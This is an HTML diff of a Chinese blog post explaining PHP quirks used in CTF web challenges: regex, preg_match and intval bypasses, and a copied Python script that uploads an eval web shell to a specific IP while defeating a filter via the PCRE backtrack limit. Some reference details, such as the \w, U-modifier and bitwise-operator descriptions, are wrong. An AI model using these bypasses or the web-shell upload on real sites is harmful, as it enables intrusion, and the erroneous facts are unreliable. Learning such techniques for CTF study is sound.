@@ -1,0 +1,1076 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || PHP特性</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>哒哒哒哒哒~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>PHP特性 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/8/16
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/PHP" style=color:#1bccbc>
+                    PHP
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p> 关于CTF中常见的一些php特性</p>
+<span id="more"></span>
+
+<h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="PHP正则"><a href="#PHP正则" class="headerlink" title="PHP正则"></a>PHP正则</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-394075.html">php的正则表达式</a></li>
+<li>正则表达式是形成搜索模式的字符序列，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串</li>
+<li>正则表达式可用于执行所有类型的文本搜索和文本替换操作</li>
+<li>在 PHP 中，正则表达式是由分隔符、模式和可选修饰符组成的字符串</li>
+<li>最左原则：正则表达式总是从目标字符串的最左侧开始，依次匹配，直到匹配到符合表达式要求的部分，或直到匹配目标字符串的结束</li>
+<li>最长原则：对于匹配到的目标字符串，正则表达式总是会匹配到符合正则表达式要求的最长的部分——即贪婪模式</li>
+<li>分隔符可以是任何非字母、数字、反斜杠或空格的字符， 最常见的分隔符是正斜杠<code>/</code>，但是当模式包含正斜杠时，可以选择其他分隔符（例如<code>#</code>或<code>~</code>）</li>
+<li>如果需要搜索其中一个特殊字符，可以使用反斜杠<code>\</code>对其进行转义，例如，要搜索一个或多个问号，可以使用以下表达式：<code>$pattern = &#39;/\?+/&#39;</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">元字符</th>
+<th align="center">含义描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">\d</td>
+<td align="center">匹配任意一个十进制数字，等价于**[0-9]**</td>
+</tr>
+<tr>
+<td align="center">\D</td>
+<td align="center">匹配任意一个除十进制以外的数字，等价于**[^0-9]**</td>
+</tr>
+<tr>
+<td align="center">\s</td>
+<td align="center">匹配任意一个空白字符 ，等价于**[\f\n\r\t\v]**</td>
+</tr>
+<tr>
+<td align="center">\S</td>
+<td align="center">匹配除空白字符以外任何一个字符，等价于**[^\f\n\r\t\v]**</td>
+</tr>
+<tr>
+<td align="center">\w</td>
+<td align="center">匹配任意一个数字、字母或下划线，等价于**[0-9a-zA-Z]**</td>
+</tr>
+<tr>
+<td align="center">\W</td>
+<td align="center">匹配除数字字母下划线以外的任意一个字符，等价于**[^0-9a-zA-Z]**</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">匹配0次、一次或多次其前的原子；<strong>zo</strong>* 能匹配 <strong>z</strong>、 <strong>zo</strong>、<strong>zoo</strong></td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">匹配一次或多次其前的原子，等价于**{1,}<strong>例如，</strong>zo+** 能匹配 <strong>zo</strong> 以及 <strong>zoo</strong></td>
+</tr>
+<tr>
+<td align="center">?</td>
+<td align="center">匹配0次或一次其前的原子，**”do(es)?”** 可以匹配 <strong>“do”</strong> 或 <strong>“does”</strong></td>
+</tr>
+<tr>
+<td align="center">.</td>
+<td align="center">匹配除了换行符以外的任意一个字符</td>
+</tr>
+<tr>
+<td align="center">|</td>
+<td align="center">匹配两个或多个分支选择</td>
+</tr>
+<tr>
+<td align="center">{n}</td>
+<td align="center">表示其前面的原子恰好出现n次</td>
+</tr>
+<tr>
+<td align="center">{n,}</td>
+<td align="center">表示其前面的原子出现不少于n次</td>
+</tr>
+<tr>
+<td align="center">{n,m}</td>
+<td align="center">表示其前面的原子至少出现n次，最多出现m次</td>
+</tr>
+<tr>
+<td align="center">^ 或 \A</td>
+<td align="center">匹配输入字符串的开始位置（或在多行模式下行的开头，即紧随一换行符之后）；在字符域**[]<strong>中表示取反，如</strong>[^\w]<strong>等于</strong>\w**;而<strong>^\w</strong>表示以单词字符开头</td>
+</tr>
+<tr>
+<td align="center">$ 或 \Z</td>
+<td align="center">匹配输入字符串的结束位置（或在多行模式下行的结尾，即紧随一换行符之前）；**\w$**表示以单词字符结尾</td>
+</tr>
+<tr>
+<td align="center">\b</td>
+<td align="center">匹配单词的边界</td>
+</tr>
+<tr>
+<td align="center">\B</td>
+<td align="center">匹配除单词边界以外的部分</td>
+</tr>
+<tr>
+<td align="center">[]</td>
+<td align="center">匹配方括号中指定的任意一个原子</td>
+</tr>
+<tr>
+<td align="center">[^]</td>
+<td align="center">匹配除方括号中的原子以外的任意一个字符</td>
+</tr>
+<tr>
+<td align="center">()</td>
+<td align="center">匹配其一个整体为一个原子，即模式单元；可以理解为由多个单个原子组成的大原子；如(my|your)baby，如果没有括号，|将匹配的是my或yourbaby，有了括号，匹配的就是mybaby或yourbaby</td>
+</tr>
+</tbody></table>
+<hr>
+<table>
+<thead>
+<tr>
+<th align="center">模式修正符号</th>
+<th align="center">功能描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">i</td>
+<td align="center">在和模式进行匹配时不区分大小写</td>
+</tr>
+<tr>
+<td align="center">m</td>
+<td align="center">将字符串视为多行；默认的正则开始”^”和结束”$”将目标字符串作为单一的一 “行” 字符（甚至其中包含有换行符也是如此）；如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行，每一行的开头就是”^”，结尾就是”$”</td>
+</tr>
+<tr>
+<td align="center">s</td>
+<td align="center">如果设定了此字符，模式中的圆点元字符”.”匹配所有的字符，包括换行符；即将字符串视为单行，换行符作为普通字符看待</td>
+</tr>
+<tr>
+<td align="center">x</td>
+<td align="center">模式中的空白忽略不计，除非它已经被转义</td>
+</tr>
+<tr>
+<td align="center">e</td>
+<td align="center">只用在pre_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为PHP代码求值，并用其结果来替换所搜索的字符串</td>
+</tr>
+<tr>
+<td align="center">U</td>
+<td align="center">贪婪模式，最大限度匹配</td>
+</tr>
+<tr>
+<td align="center">D</td>
+<td align="center">模式中的”$”仅匹配目标字符串的结尾，没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前；如果设定了m修正字符则忽略此选项</td>
+</tr>
+</tbody></table>
+<h4 id="贪婪匹配与惰性匹配"><a href="#贪婪匹配与惰性匹配" class="headerlink" title="贪婪匹配与惰性匹配"></a>贪婪匹配与惰性匹配</h4><ul>
+<li>贪婪匹配：就是匹配尽可能多的字符<br>比如，正则表达式中<code>/m.*n/</code>，它将匹配最长以m开始，n结尾的字符串，如果用它来搜索manmpndegenc的话，它将匹配到的字符串是manmpndegen而非man，可以这样想，当匹配到m的时候，它将从后面往前匹配字符n</li>
+<li>惰性匹配：就是匹配尽可能少的字符<br>有的时候，我们需要的并不是去贪婪匹配，而是尽可能少的去匹配；这时候，就需要将其转为惰性匹配，要在其后面添加一个<code>？</code>，如<code>m.*?n</code>将匹配manmpndegenc，匹配到的字符串是man</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">函数符</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">*?</td>
+<td align="center">零次或多次，但尽可能少的匹配</td>
+</tr>
+<tr>
+<td align="center">+?</td>
+<td align="center">一次或多次，但尽可能少的匹配</td>
+</tr>
+<tr>
+<td align="center">??</td>
+<td align="center">0次或1次，但尽可能少的匹配</td>
+</tr>
+<tr>
+<td align="center">{n,}?</td>
+<td align="center">至少n次，但尽可能少的匹配</td>
+</tr>
+<tr>
+<td align="center">{n,m}?</td>
+<td align="center">n到m次 ，但尽可能少的匹配</td>
+</tr>
+</tbody></table>
+<h4 id="回溯和固态分组"><a href="#回溯和固态分组" class="headerlink" title="回溯和固态分组"></a>回溯和固态分组</h4><p><strong>回溯</strong></p>
+<ul>
+<li>找不到什么特别清楚的定义，所以找了个例子</li>
+<li>字符串：<code>$str=&#39;aageacwgewcaw&#39;</code></li>
+<li>正则表达式： <code>$pattern=&#39;/a\w*c/i&#39;</code> ——不区分大小写的匹配a开头c结尾的由数字字母下划线构成的字符串</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">匹配过程</th>
+<th align="center">接下来操作描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">‘a\w*c’中a匹配到’aageacwgewcaw’中第一个字符a</td>
+<td align="center">\w进行下一个字符匹配</td>
+</tr>
+<tr>
+<td align="center">因为\w是贪婪匹配，会一直匹配到’aageacwgewcaw’中最后一个字符w</td>
+<td align="center">c进行下一个字符匹配时</td>
+</tr>
+<tr>
+<td align="center">‘a\w*c’中c发现没有可以匹配的</td>
+<td align="center">于是\w匹配进行第一次回溯，匹配到倒数第二个字符a</td>
+</tr>
+<tr>
+<td align="center">‘a\w*c’中c发现还是没有可以匹配的</td>
+<td align="center">于是\w匹配进行第二次回溯，匹配到倒数第三个字符c</td>
+</tr>
+<tr>
+<td align="center">‘a\w*c’中c匹配成功</td>
+<td align="center">匹配结束返回结果</td>
+</tr>
+</tbody></table>
+<p><strong>固态分组</strong></p>
+<ul>
+<li><code>‘\w+:’</code>这个表达式在进行匹配时的流程是：<ul>
+<li>会优先去匹配所有的符合\w的字符，假如字符串的末尾没有<code>’:’</code>，即匹配没有找到冒号，此时触发回溯机制，他会迫使前面的<code>\w+</code>释放字符，并且在交还的字符中重新尝试与<code>’:’</code>作比对</li>
+<li>但是<code>\w</code>是不包含冒号的，显然无论如何都不会匹配成功，可是依照回溯机制，引擎还是会往前找，造成对资源的浪费</li>
+<li>因此就需要避免这种回溯，将前面匹配到的内容固化，不令其存储备用状态，那么引擎就会因为没有备用状态可用而结束匹配过程，减少回溯的次数</li>
+</ul>
+</li>
+<li> 所以固态分组主要目的是避免不必要的回溯，使用<code>(?&gt;)</code>来实现，将表达式改为<code>&#39;/(?&gt;\w+):/&#39;</code></li>
+</ul>
+<h4 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h4><table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">preg_match()</td>
+<td align="center">如果在字符串中找到该模式，则返回1，否则返回0， 如果发生错误返回 FALS；在第一次匹配后 将会停止搜索</td>
+</tr>
+<tr>
+<td align="center">preg_match_all()</td>
+<td align="center">返回模式在字符串中被找到的次数，也可以是0；会一直搜索subject直到到达结尾</td>
+</tr>
+<tr>
+<td align="center">preg_replace()</td>
+<td align="center">返回一个新字符串，其中匹配的模式已被另一个字符串替换</td>
+</tr>
+</tbody></table>
+<p><strong>preg_match()</strong></p>
+<blockquote>
+<ul>
+<li>函数原型：<code>int preg_match( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code></li>
+<li>参数：<ul>
+<li><strong>$pattern</strong>：要搜索的模式；**$subject**：字符串</li>
+<li><strong>$matches</strong>：如果提供了参数<code>matches</code>，它将被填充为搜索结果， <code>$matches[0]</code>将包含完整模式匹配到的文本， <code>$matches[1]</code>将包含第一个捕获子组匹配到的文本，以此类推</li>
+<li><strong>$flags</strong>：可以结合下面标记使用<ul>
+<li><code>PREG_OFFSET_CAPTURE</code>，如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量（相对于目标字符串的）——注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量</li>
+<li><code>PREG_UNMATCHED_AS_NULL</code>使用该标记，未匹配的子组会报告为<code>null</code>；未使用时，报告为空的string</li>
+</ul>
+</li>
+<li><strong>$offset</strong>：通常搜索从目标字符串的开始位置开始，可选参数<code>offset</code>用于指定从目标字符串的某个位置开始搜索（单位是字节）</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><strong>preg_match_all()</strong></p>
+<blockquote>
+<ul>
+<li>搜索<code>subject</code>中所有匹配<code>pattern</code>给定正则表达式的匹配结果并且将它们以<code>flag</code>指定顺序输出到<code>matches</code>中，在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索</li>
+<li>函数原型：<code>int preg_match_all( string $pattern, string $subject [, array &amp;$matches = [, int$flags= 0[, int $offset = 0 ]]] )</code></li>
+<li>参数：<ul>
+<li><strong>$pattern</strong>：要搜索的模式；**$subject**：字符串</li>
+<li><strong>$matches</strong>：多维数组，作为输出参数输出所有匹配结果, 数组排序通过<code>flags</code>指定</li>
+<li><strong>$flags</strong>：可以结合下面标记使用（注意不能同时使用<code>PREG_PATTERN_ORDER</code>和 <code>PREG_SET_ORDER</code>）<ul>
+<li><code>PREG_PATTERN_ORDER</code>结果排序为<code>$matches[0]</code>保存完整模式的所有匹配， <code>$matches[1]</code> 保存第一个子组的所有匹配，以此类推</li>
+<li><code>PREG_SET_ORDER</code>结果排序为$matches[0]包含第一次匹配得到的所有匹配(包含子组)， $matches[1]是包含第二次匹配到的所有匹配(包含子组)的数组，以此类推</li>
+<li><code>PREG_OFFSET_CAPTURE</code>如果这个标记被传递，每个发现的匹配返回时会增加它相对目标字符串的字节偏移量， 注意这会改变<code>matches</code>中的每一个匹配结果字符串元素，使其 成为一个第0个元素为匹配结果字符串，第1个元素为匹配结果字符串在<code>subject</code>中的偏移量</li>
+<li><code>PREG_UNMATCHED_AS_NULL</code>使用该标记，未匹配的子组会报告为<code>null</code>；未使用时，报告为空的string</li>
+<li>如果没有给定排序标记，假定设置为<code>PREG_PATTERN_ORDER</code></li>
+</ul>
+</li>
+<li><strong>$offset</strong>：通常搜索从目标字符串的开始位置开始，可选参数<code>offset</code>用于指定从目标字符串的某个位置开始搜索（单位是字节）</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><strong>preg_replace()</strong></p>
+<blockquote>
+<ul>
+<li>函数原型：<code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></li>
+<li>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</li>
+<li>参数说明：<ul>
+<li><strong>$pattern</strong>：要搜索的模式，可以是字符串或一个字符串数组</li>
+<li><strong>$replacement</strong>：用于替换的字符串或字符串数组</li>
+<li><strong>$subject</strong>：要搜索替换的目标字符串或字符串数组</li>
+<li><strong>$limit</strong>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数， 默认是-1（无限制）</li>
+<li><strong>$count</strong>：可选，为替换执行的次数</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h4 id="preg-match-绕过"><a href="#preg-match-绕过" class="headerlink" title="preg_match()绕过"></a>preg_match()绕过</h4><h5 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h5><ul>
+<li>preg_match()只能处理字符串，当传入的subject是数组时会返回false</li>
+<li>preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句</li>
+</ul>
+<pre><code class="php">&lt;?php
+    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;
+        die(&quot;no!&quot;);
+    &#125;
+    if(intval($num))&#123;
+        echo $flag;
+    &#125;
+//payload: num[]=1
+</code></pre>
+<h5 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h5><ul>
+<li><p>用于获取变量的整数值</p>
+</li>
+<li><p>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值， intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
+</li>
+<li><p>函数原型：<code>int intval ( mixed $var [, int $base = 10 ] )</code></p>
+</li>
+<li><p>参数说明：</p>
+<ul>
+<li><p>$var：要转换成 integer 的数量值</p>
+</li>
+<li><p>$base：转化所使用的进制</p>
+</li>
+<li><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>
+<ul>
+<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)</li>
+</ul>
+</li>
+<li><p>如果字符串以 “0” 开始，使用 8 进制(octal)，否则，将使用 10 进制 (decimal)</p>
+<ul>
+<li>$var中存在字母的话遇到字母就停止读取</li>
+</ul>
+</li>
+<li><p>成功时返回 var 的 integer 值，失败时返回 0，空的 array 返回 0，非空的 array 返回 1</p>
+</li>
+<li><p>如果字符串不是是数字字符串或者无前导数字， 则转换为0</p>
+</li>
+<li><p>如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值，如果字符串第一个是<code>-</code>，则从第二个开始算起</p>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="php">&lt;?php
+    if($num===&quot;4476&quot;)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+if(intval($num,0)===4476)&#123;
+        echo $flag;
+    &#125;
+else&#123;
+        echo intval($num,0);
+    &#125;
+
+//intval(&#39;4476.0&#39;)===4476    小数点  
+//intval(&#39;+4476.0&#39;)===4476   正负号
+//intval(&#39;4476e0&#39;)===4476    科学计数法
+//intval(&#39;0x117c&#39;)===4476    16进制
+//intval(&#39;010574&#39;)===4476    8进制
+//intval(&#39; 010574&#39;)===4476   8进制+空格
+//intval(&#39; 4476&#39;)===4476     空格
+</code></pre>
+<h5 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h5><pre><code class="php">&lt;?php
+    if(preg_match(&#39;/^php$/im&#39;, $a))&#123;
+        if(preg_match(&#39;/^php$/i&#39;, $a))&#123;
+            echo &#39;NO!&#39;;
+        &#125;
+        else&#123;
+            echo $flag;
+        &#125;
+    &#125;
+//payload: a=%0aphp
+</code></pre>
+<p><code>.</code>不会匹配换行符</p>
+<pre><code class="php">&lt;?php
+    if (preg_match(&#39;/^.*(flag).*$/&#39;, $c)) &#123;
+        echo &#39;NO!&#39;;
+    &#125;
+//payload: c=\nflag
+</code></pre>
+<p>在非多行模式下，<code>$</code>会忽略在句尾的<code>%0a</code></p>
+<pre><code class="php">&lt;?php
+    $c=$_GET[&#39;c&#39;];
+    if (preg_match(&#39;/^flag$/&#39;, $_GET[&#39;c&#39;]) &amp;&amp; $_GET[&#39;c&#39;] !== &#39;flag&#39;) &#123;
+        echo $flag;
+    &#125;
+//payload: c=flag%0a
+</code></pre>
+<h5 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h5><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 </a></p>
+</li>
+<li><p>PHP 为了防止正则表达式的<strong>拒绝服务攻击（reDOS）</strong>，给 pcre 设定了一个回溯次数上限<code>pcre.backtrack_limit</code>，回溯次数上限默认是 100 万</p>
+</li>
+<li><p>如果回溯次数超过了 100 万，preg_match 将不再返回 1 和 0，而是 false</p>
+</li>
+<li><p>可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限</p>
+</li>
+</ul>
+<pre><code class="php">&lt;?php
+function is_php($data)&#123;  
+    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);  
+&#125;
+
+if(!is_php($input)) &#123;
+    // fwrite($f, $input); ...
+&#125;
+//大意是判断一下用户输入的内容有没有PHP代码，如果没有，则写入文件
+</code></pre>
+<p>可以通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制</p>
+<pre><code class="python">import requests
+from io import BytesIO
+
+files = &#123;
+  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)
+&#125;
+
+res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)
+print(res.headers)
+#但是还没学python 抄了个脚本参考一下
+</code></pre>
+<h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><ul>
+<li>把一个字符串写入文件中</li>
+<li>函数原型：<code>int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</code></li>
+<li>参数：<ul>
+<li><strong>filename</strong>：要在其中写入数据的文件的路径</li>
+<li><strong>data</strong>：要写入的数据，可以是字符串、数组或流资源<ul>
+<li>如果是流资源，则该流的剩余缓冲区将复制到指定的文件中，与使用<code>stream_copy_to_stream()</code>类似</li>
+<li>data还可以将参数指定为单维数组，等效于<code>datafile_put_contents($filename, implode(&#39;&#39;, $array))</code></li>
+</ul>
+</li>
+<li><strong>flags</strong>的值可以是（<code>FILE_USE_INCLUDE_PATH</code>，<code>LOCK_EX</code>，<code>FILE_APPEND</code>）的任意组合，并可用<code>|</code>运算符连接</li>
+</ul>
+</li>
+<li>该函数访问文件时，遵循以下规则：<ul>
+<li>如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 filename副本的内置路径</li>
+<li>如果文件不存在，将创建一个文件</li>
+<li>打开文件</li>
+<li>如果设置了 LOCK_EX，那么将锁定文件</li>
+<li>如果设置了 FILE_APPEND，那么将移至文件末尾，否则将会清除文件的内容</li>
+<li>向文件中写入数据</li>
+<li>关闭文件并对所有文件解锁</li>
+</ul>
+</li>
+<li>如果成功，该函数将返回写入文件中的字符数，如果失败，则返回 False</li>
+</ul>
+<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><ul>
+<li>in_array() 函数搜索数组中是否存在指定的值，延用了php中的== ，感觉跟array_search差不多</li>
+<li>函数原型：<code>in_array(search,array,type)</code></li>
+<li>参数：<ul>
+<li><strong>search</strong>：必需，规定要在数组搜索的值</li>
+<li><strong>array</strong>：必需，规定要搜索的数组</li>
+<li><strong>type</strong>：可选，如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同</li>
+<li>如果search参数是字符串，且type参数设置为 true，则搜索区分大小写</li>
+</ul>
+</li>
+<li>返回值：如果在数组中找到值则返回 TRUE，否则返回 FALSE</li>
+</ul>
+<h3 id="运算符与优先级"><a href="#运算符与优先级" class="headerlink" title="运算符与优先级"></a>运算符与优先级</h3><ul>
+<li><p>运算符优先级指定了两个表达式绑定得有多 “紧密” </p>
+</li>
+<li><p>运算符优先级相同，那运算符的结合方向决定了该如何运算</p>
+<ul>
+<li>“-“是左联的，那么<code>1 - 2 - 3</code>就等同于<code>(1 - 2) - 3</code>并且结果是<code>-4</code></li>
+<li>“=”是右联的，所以<code>$a = $b = $c</code>等同于<code>$a = ($b = $c)</code></li>
+</ul>
+</li>
+<li><p>关于NULL 合并运算符<code>??</code></p>
+<ul>
+<li>当 expr1 为 **<code>null</code>**，表达式 <code>(expr1) ?? (expr2)</code> 等同于 expr2，否则为 expr1</li>
+</ul>
+</li>
+<li><p>&amp;&amp;与||的优先级高于=，=的优先级高于and与or ——(test3.php)</p>
+</li>
+<li><p>php前边是true，后边就不比了</p>
+</li>
+<li><p>关系型运算符优先级高到低为：not&gt; and&gt; or，&amp;&amp;优先级高于||</p>
+</li>
+<li><pre><code class="php">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0)&#123;
+       //......
+&#125;
+//只要令v1=数字，v0就为true
+</code></pre>
+</li>
+<li><p><strong>xor</strong>：异或运算——如果 x 和 y 有且仅有一个为 true，则返回 true，(<code>x==6 xor y==3</code>) 返回 false</p>
+</li>
+<li><p>-这个是取反</p>
+</li>
+<li><p>三目运算符<code>?:</code>的理解和变量覆盖</p>
+<ul>
+<li><p>三元运算符是个语句，因此其求值不是变量，而是语句的结果</p>
+</li>
+<li><p>表达式 <code>(expr1) ? (expr2) : (expr3)</code> 在 expr1 求值为 <code>true</code> 时的值为 expr2，在 expr1 求值为 <code>false</code> 时的值为 expr3</p>
+</li>
+<li><pre><code class="php">&lt;?php
+// 三目运算符的例子
+$action = (empty($_POST[&#39;action&#39;])) ? &#39;default&#39; : $_POST[&#39;action&#39;];
+// 以上等同于以下的  if/else 语句
+if (empty($_POST[&#39;action&#39;])) &#123;
+    $action = &#39;default&#39;;
+&#125; else &#123;
+    $action = $_POST[&#39;action&#39;];
+&#125;
+</code></pre>
+</li>
+<li><pre><code class="php">&lt;?php
+    $_GET?$_GET=&amp;$_POST:&#39;flag&#39;;  //GET被设置，就可以用POST覆盖GET的值
+    $_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;
+    $_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;;
+    //是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖,且这个被覆盖的GET没有指定
+    highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);  //等于flag就输出flag，不等于显示源码
+//payload: get：1=1 post：HTTP_FLAG=flag
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>&amp;是按位与（全1为1，否则为0）；|是按位或（全1为1，否则为0）；^是按位异或（不同为1，相同为0）——计算方法同C++</p>
+</li>
+<li><p>～这个是按位取反</p>
+<ul>
+<li><p>0取反结果为0，-1取反结果为0，-2取反结果为1，-3取反结果为2，-4取反结果为3，-5取反结果为4，依此类推，反过来也是一样</p>
+</li>
+<li><p>在计算机中，负数以其正值的补码形式表达</p>
+</li>
+<li><p>取反后的结果：从左向右看，第一位0正1符</p>
+</li>
